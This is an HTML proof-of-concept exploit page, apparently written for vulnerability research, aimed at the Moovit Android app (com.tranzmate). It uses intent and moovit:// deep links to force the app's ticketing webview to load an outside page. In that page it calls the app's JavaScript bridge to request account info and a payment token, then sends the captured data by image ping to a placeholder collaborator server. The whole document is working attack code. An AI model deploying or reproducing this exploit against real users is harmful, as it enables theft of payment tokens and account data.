<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Moovit Pivot & Exploit</title>
    <style>
        body { background-color: #121212; color: #00ff00; font-family: monospace; padding: 10px; text-align: center; }
        .btn {
            display: block;
            width: 100%;
            padding: 20px;
            margin: 10px 0;
            background: #d32f2f;
            color: white;
            text-decoration: none;
            font-size: 18px;
            border-radius: 8px;
            font-weight: bold;
            border: 2px solid white;
        }
        .btn-blue { background: #1976d2; }
        #logs { 
            text-align: left; 
            background: #000; 
            border: 1px solid #333; 
            padding: 10px; 
            min-height: 100px;
            white-space: pre-wrap;
            word-break: break-all;
            margin-top: 20px;
        }
        h2 { border-bottom: 1px solid #555; padding-bottom: 10px; margin-bottom: 20px;}
    </style>
</head>
<body>

    <h2>MOOVIT EXPLOIT</h2>
    <div id="status" style="color: orange; font-weight: bold;">CHECKING CONTEXT...</div>

    <div id="pivot-controls">
        <p>STEP 1: CLICK TO PIVOT</p>
        
        <a class="btn" target="_blank" href="intent:#Intent;component=com.tranzmate/com.moovit.ticketing.purchase.web.PurchaseWebTicketActivity;S.url=https://gelo.gg/pocs/moovit_poc.html;end">
            1. FORCE INTENT PIVOT
        </a>

        <a class="btn btn-blue" href="moovit://ticketing/purchase?url=https://gelo.gg/pocs/moovit_poc.html">
            2. TRY MOOVIT:// LINK
        </a>
    </div>

    <h3>EXFIL LOGS</h3>
    <div id="logs">Waiting for execution...</div>

    <script>
        // ==========================================
        // CONFIGURATION
        // ==========================================
        const EXFIL_SERVER = "https://your-collaborator-url.com"; 

        function log(msg) {
            document.getElementById("logs").innerHTML += "[*] " + msg + "<br>";
            // Image ping for exfil
            new Image().src = EXFIL_SERVER + "/?log=" + btoa(msg);
        }

        // ==========================================
        // EXPLOIT PAYLOAD
        // ==========================================
        function runExploit() {
            document.getElementById("status").innerText = "!!! VULNERABLE !!!";
            document.getElementById("status").style.color = "#00ff00";
            document.getElementById("pivot-controls").style.display = "none"; // Hide buttons to clean UI
            
            log("Interface 'moovit' found.");

            // 1. SETUP LISTENERS
            window.onPaymentTokenResult = function(token) {
                log("SUCCESS! TOKEN: " + token);
                alert("STOLEN TOKEN: " + token);
            };

            window.onRequestErrorResult = function(error) {
                log("CALLBACK RECEIVED: " + error);
                alert("DATA: " + error);
            };

            // 2. TRIGGER ACTIONS
            try {
                log("Requesting Account Info...");
                window.moovit.requestAccountInfo();
            } catch(e) { log("Err Account: " + e.message); }

            try {
                log("Requesting Payment Token...");
                window.moovit.requestPaymentToken(JSON.stringify({amount:"0", currency:"USD"}));
            } catch(e) { log("Err Payment: " + e.message); }
        }

        // ==========================================
        // INIT CHECK
        // ==========================================
        if (window.moovit) {
            runExploit();
        } else {
            document.getElementById("status").innerText = "SAFE CONTEXT (CLICK BUTTONS)";
            log("Bridge not found. Please click a Pivot button above.");
        }
    </script>

</body>
</html>
